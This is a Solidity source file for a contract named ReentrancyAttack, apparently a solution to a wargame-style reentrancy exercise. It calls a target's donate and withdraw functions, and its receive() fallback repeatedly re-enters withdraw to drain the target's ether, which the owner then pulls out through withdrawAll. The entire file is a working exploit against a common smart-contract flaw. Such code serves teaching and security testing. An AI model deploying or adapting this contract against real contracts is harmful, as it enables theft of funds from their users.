// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IReentrancy {
    function donate(address _to) external payable;
    function withdraw(uint amount) external;
}

contract ReentrancyAttack {
    address public owner;
    IReentrancy targetContract;
    uint targetValue = 1000000000000000;

    constructor(address _targetAddy) public {
        targetContract = IReentrancy(_targetAddy);
        owner = msg.sender;
    }

    function balance() public view returns (uint) {
        return address(this).balance;
    }

    function donateAndWithdraw() public payable {
        require(msg.value >= targetValue);
        targetContract.donate.value(msg.value)(address(this));
        targetContract.withdraw(msg.value);
    }

    function withdrawAll() public returns (bool) {
        require(msg.sender == owner, "my money!");
        uint totalBalance = address(this).balance;
        (bool sent, ) = msg.sender.call.value(totalBalance)("");
        require(sent, "Failed to send Ether");
        return sent;
    }

    receive() external payable {
        uint targetBalance = address(targetContract).balance;
        if (targetBalance >= targetValue) {
            targetContract.withdraw(targetValue);
        }
    }
}